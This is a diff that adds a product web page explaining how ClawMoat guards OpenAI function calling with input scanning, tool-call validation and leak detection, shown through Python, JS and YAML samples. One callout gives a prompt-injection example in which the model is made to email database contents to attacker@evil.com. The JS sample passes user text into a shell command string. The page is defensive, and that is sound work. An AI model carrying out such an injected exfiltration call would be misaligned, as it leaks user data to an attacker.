@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Securing OpenAI Function Calling with ClawMoat</title>
+<meta name="description" content="Protect your OpenAI API integration from prompt injection and data leakage with ClawMoat runtime security.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏰</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--navy:#0F172A;--navy-light:#1E293B;--navy-mid:#334155;--blue:#3B82F6;--emerald:#10B981;--white:#F8FAFC;--gray:#94A3B8;--red:#EF4444;--amber:#F59E0B}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--navy);color:var(--white);line-height:1.7}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(15,23,42,.92);backdrop-filter:blur(12px);border-bottom:1px solid rgba(59,130,246,.15);padding:16px 0}
+nav .container{display:flex;align-items:center;justify-content:space-between;max-width:1140px;margin:0 auto;padding:0 24px}
+.logo{font-size:1.25rem;font-weight:700;display:flex;align-items:center;gap:8px;color:var(--white)}
+.logo span{color:var(--emerald)}
+.nav-links{display:flex;gap:28px;align-items:center}
+.nav-links a{color:var(--gray);font-size:.9rem;transition:color .2s}
+.nav-links a:hover{color:var(--white);text-decoration:none}
+.nav-links .btn-sm{color:var(--navy);background:var(--emerald);padding:8px 18px;border-radius:8px;font-weight:600;font-size:.85rem}
+.container{max-width:860px;margin:0 auto;padding:0 24px}
+.article{padding:120px 0 80px}
+.breadcrumb{font-size:.85rem;color:var(--gray);margin-bottom:32px}
+.breadcrumb a{color:var(--gray)}
+.breadcrumb a:hover{color:var(--white)}
+h1{font-size:2.5rem;line-height:1.2;margin-bottom:16px;background:linear-gradient(135deg,var(--emerald),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.subtitle{font-size:1.15rem;color:var(--gray);margin-bottom:48px;max-width:600px}
+h2{font-size:1.5rem;margin:48px 0 16px;color:var(--white)}
+h3{font-size:1.15rem;margin:32px 0 12px;color:var(--emerald)}
+p{color:var(--gray);margin-bottom:16px}
+ul,ol{color:var(--gray);margin:0 0 16px 24px}
+li{margin-bottom:8px}
+code{font-family:'SF Mono',Monaco,Consolas,monospace;font-size:.88em}
+:not(pre)>code{background:var(--navy-light);padding:2px 8px;border-radius:4px;color:var(--emerald)}
+pre{background:var(--navy-light);border:1px solid var(--navy-mid);border-radius:12px;padding:20px 24px;overflow-x:auto;margin:16px 0 24px;position:relative}
+pre code{color:var(--gray);font-size:.85rem;line-height:1.6}
+.lang-label{position:absolute;top:8px;right:12px;font-size:.7rem;text-transform:uppercase;color:var(--navy-mid);font-weight:700;letter-spacing:1px}
+.callout{background:var(--navy-light);border-left:3px solid var(--emerald);border-radius:0 12px 12px 0;padding:16px 20px;margin:24px 0;color:var(--gray)}
+.callout.warning{border-left-color:var(--amber)}
+.callout.danger{border-left-color:var(--red)}
+.callout strong{color:var(--white)}
+.flow-diagram{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:24px 0;font-size:.9rem}
+.flow-step{background:var(--navy-light);border:1px solid var(--navy-mid);padding:10px 16px;border-radius:8px;color:var(--white);font-weight:600}
+.flow-step.guard{border-color:var(--emerald);color:var(--emerald)}
+.flow-arrow{color:var(--navy-mid);font-size:1.2rem}
+.three-col{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin:24px 0}
+.three-col .card{background:var(--navy-light);border:1px solid var(--navy-mid);border-radius:12px;padding:20px;text-align:center}
+.three-col .card .icon{font-size:2rem;margin-bottom:8px}
+.three-col .card h4{color:var(--white);margin-bottom:4px;font-size:.95rem}
+.three-col .card p{font-size:.85rem;margin:0}
+footer{border-top:1px solid var(--navy-mid);padding:40px 0;text-align:center;color:var(--navy-mid);font-size:.85rem;margin-top:40px}
+@media(max-width:768px){
+  .nav-links{display:none}
+  h1{font-size:1.75rem}
+  .three-col{grid-template-columns:1fr}
+  .flow-diagram{flex-direction:column}
+  .flow-arrow{transform:rotate(90deg)}
+}
+</style>
+</head>
+<body>
+
+<nav>
+<div class="container" style="max-width:1140px">
+  <a href="/" class="logo">🏰 Claw<span>Moat</span></a>
+  <div class="nav-links">
+    <a href="/">Home</a>
+    <a href="/integrations/openai.html" style="color:var(--white)">Integrations</a>
+    <a href="/blog/">Blog</a>
+    <a href="https://github.com/darfaz/clawmoat">GitHub</a>
+    <a href="/#waitlist" class="btn-sm">Get Early Access</a>
+  </div>
+</div>
+</nav>
+
+<article class="article">
+<div class="container">
+
+<div class="breadcrumb">
+  <a href="/">ClawMoat</a> → <a href="/integrations/openai.html">Integrations</a> → OpenAI
+</div>
+
+<h1>Securing OpenAI Function Calling with ClawMoat</h1>
+<p class="subtitle">Three layers of protection for your OpenAI API integration: input scanning, function call validation, and response leak detection.</p>
+
+<div class="three-col">
+  <div class="card">
+    <div class="icon">🔍</div>
+    <h4>Input Scanning</h4>
+    <p>Catch prompt injections before they reach the API</p>
+  </div>
+  <div class="card">
+    <div class="icon">🛡️</div>
+    <h4>Function Validation</h4>
+    <p>Verify tool calls match your security policy</p>
+  </div>
+  <div class="card">
+    <div class="icon">🔒</div>
+    <h4>Leak Detection</h4>
+    <p>Scan responses for PII and sensitive data</p>
+  </div>
+</div>
+
+<h2>1. Scanning User Messages Before the API</h2>
+<p>Every user message should pass through ClawMoat before it's sent to OpenAI. This catches prompt injections, jailbreak attempts, and social engineering attacks.</p>
+
+<pre><code><span class="lang-label">Python</span>import subprocess
+import json
+from openai import OpenAI
+
+client = OpenAI()
+
+def clawmoat_scan(text: str, scan_type: str = "input") -> dict:
+    """Scan text through ClawMoat."""
+    result = subprocess.run(
+        ["clawmoat", "scan", "--json", "--type", scan_type, "--input", text],
+        capture_output=True, text=True
+    )
+    return json.loads(result.stdout)
+
+def secure_chat(messages: list, tools: list = None):
+    # Scan the latest user message
+    user_msg = next(m for m in reversed(messages) if m["role"] == "user")
+    scan = clawmoat_scan(user_msg["content"])
+    
+    if scan["verdict"] == "BLOCK":
+        return {
+            "blocked": True,
+            "reason": scan["reason"],
+            "threat": scan.get("threat_type", "unknown")
+        }
+    
+    # Safe to call OpenAI
+    response = client.chat.completions.create(
+        model="gpt-4o",
+        messages=messages,
+        tools=tools
+    )
+    return response</code></pre>
+
+<pre><code><span class="lang-label">JS</span>import { execSync } from "child_process";
+import OpenAI from "openai";
+
+const openai = new OpenAI();
+
+function scanMessage(content) {
+  const result = execSync(
+    `clawmoat scan --json --type input --input ${JSON.stringify(content)}`,
+    { encoding: "utf-8" }
+  );
+  return JSON.parse(result);
+}
+
+async function secureChat(messages, tools) {
+  const userMsg = [...messages].reverse().find(m => m.role === "user");
+  const scan = scanMessage(userMsg.content);
+  
+  if (scan.verdict === "BLOCK") {
+    throw new Error(`Blocked: ${scan.reason}`);
+  }
+  
+  return openai.chat.completions.create({
+    model: "gpt-4o",
+    messages,
+    tools,
+  });
+}</code></pre>
+
+<h2>2. Validating Function Call Arguments</h2>
+<p>When the model decides to call a function, ClawMoat validates the function name and arguments against your policy before execution.</p>
+
+<div class="flow-diagram">
+  <div class="flow-step">GPT-4o Response</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step">Function Call</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step guard">🏰 Validate Args</div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step">Execute</div>
+</div>
+
+<pre><code><span class="lang-label">Python</span>def validate_and_execute(tool_call):
+    """Validate a function call through ClawMoat before executing."""
+    func_name = tool_call.function.name
+    func_args = tool_call.function.arguments
+    
+    # Validate through ClawMoat
+    validation = subprocess.run(
+        ["clawmoat", "validate-tool", "--json",
+         "--tool", func_name,
+         "--args", func_args],
+        capture_output=True, text=True
+    )
+    result = json.loads(validation.stdout)
+    
+    if result["verdict"] == "BLOCK":
+        return json.dumps({
+            "error": f"Function call blocked: {result['reason']}",
+            "blocked_by": "ClawMoat"
+        })
+    
+    # Safe to execute
+    return execute_function(func_name, json.loads(func_args))
+
+# Process the response
+response = secure_chat(messages, tools)
+message = response.choices[0].message
+
+if message.tool_calls:
+    for tool_call in message.tool_calls:
+        result = validate_and_execute(tool_call)
+        messages.append({
+            "role": "tool",
+            "tool_call_id": tool_call.id,
+            "content": result
+        })</code></pre>
+
+<div class="callout danger">
+  <strong>🚨 Without validation:</strong> A prompt injection could make GPT-4 call <code>send_email(to="attacker@evil.com", body=database_contents)</code>. ClawMoat catches this by checking the recipient against your allowed domains policy.
+</div>
+
+<h2>3. Checking Responses for Data Leakage</h2>
+<p>The final layer: scan the model's response before showing it to the user. Catch accidental PII exposure, API keys, and internal data that shouldn't leak.</p>
+
+<pre><code><span class="lang-label">Python</span>def secure_response(response_text: str) -> str:
+    """Scan model response for data leakage."""
+    scan = clawmoat_scan(response_text, scan_type="output")
+    
+    if scan["verdict"] == "BLOCK":
+        return "I can't share that information."
+    
+    if scan.get("redacted"):
+        # ClawMoat found and masked sensitive data
+        return scan["redacted_text"]
+    
+    return response_text
+
+# Full secure pipeline
+def full_secure_chat(user_input: str):
+    messages = [{"role": "user", "content": user_input}]
+    
+    # Layer 1: Scan input
+    response = secure_chat(messages, tools=my_tools)
+    
+    # Layer 2: Validate function calls (handled above)
+    # ...
+    
+    # Layer 3: Scan output
+    final_text = response.choices[0].message.content
+    return secure_response(final_text)</code></pre>
+
+<pre><code><span class="lang-label">Shell</span># Quick test from the command line
+echo "Here's the API key: sk-abc123..." | clawmoat scan --type output
+
+# Output:
+# ⚠️  WARN: Potential API key detected
+# Redacted: Here's the API key: [REDACTED]</code></pre>
+
+<h2>Configuration Example</h2>
+<pre><code><span class="lang-label">YAML</span># clawmoat.config.yaml
+scan:
+  input:
+    prompt_injection: true
+    jailbreak_detection: true
+  output:
+    pii_detection: true
+    api_key_detection: true
+    internal_data_patterns:
+      - "internal-.*\\.company\\.com"
+      - "CONFIDENTIAL"
+
+tools:
+  allowed:
+    - get_weather
+    - search_docs
+    - send_email
+  policies:
+    send_email:
+      allowed_domains:
+        - "company.com"
+        - "partner.com"
+      max_recipients: 3</code></pre>
+
+<h2>Next Steps</h2>
+<ul>
+  <li><a href="/integrations/langchain.html">LangChain Integration</a> — agent-level security with tool wrappers</li>
+  <li><a href="/integrations/openclaw.html">ClawMoat + OpenClaw</a> — zero-config security as a skill</li>
+  <li><a href="https://github.com/darfaz/clawmoat">GitHub repo</a> — full documentation and examples</li>
+</ul>
+
+</div>
+</article>
+
+<footer>
+  <p>🏰 ClawMoat — Security moat for AI agents</p>
+</footer>
+
+</body>
+</html>
